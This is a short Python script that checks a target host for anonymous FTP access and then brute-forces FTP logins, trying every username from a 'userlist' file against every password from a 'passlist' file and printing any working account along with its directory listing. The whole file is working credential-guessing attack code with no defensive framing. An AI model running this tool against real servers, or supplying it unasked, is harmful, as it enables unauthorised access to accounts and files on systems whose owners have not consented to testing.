#!/usr/bin/python3

import sys
import ftplib

def directory_listing(ftp_connection):
  lines = []
  ftp_connection.dir("/", lines.append)
  pwd = ftp_connection.pwd()
  print("[.] Content of Directory " + pwd)
  for line in lines:
    print(line)
  print("\n")
  return

def anonFTP(hostname):
  try:
    ftp = ftplib.FTP(hostname)
    ftp.login('anonymous', 'test@test.com')
    print("[+] " + hostname + " is an anonymous FTP server")
    directory_listing(ftp)
    ftp.quit()
    return True 
  except:
    print("[-] " + ftpsvr + " is either offline or not an FTP server")
    return False

def ftp_brute(hostname, user, password):
  try:
    ftp = ftplib.FTP(hostname)
    ftp.login(user, password)
    print("[+] FOUND ACCOUNT User: " + user + " Password: " + password)
    directory_listing(ftp)
    ftp.quit()
    return True
  except:
    return False


ftpsvr = sys.argv[1]

print(ftpsvr + ": Checking anonymous FTP server status")
ftp_result = anonFTP(ftpsvr)

# Brute forcing
print("\n" + ftpsvr + ": Brute forcing FTP server...")
userlistfile = open("userlist", "r")
for user in userlistfile.readlines():
  passlistfile = open("passlist", "r")
  for password in passlistfile.readlines():
    # strip trailing new lines
    user = user.rstrip()
    password = password.rstrip()
    print("[.] Trying user: " + user + " password: " + password)
    ftp_brute(ftpsvr, user, password)  
      
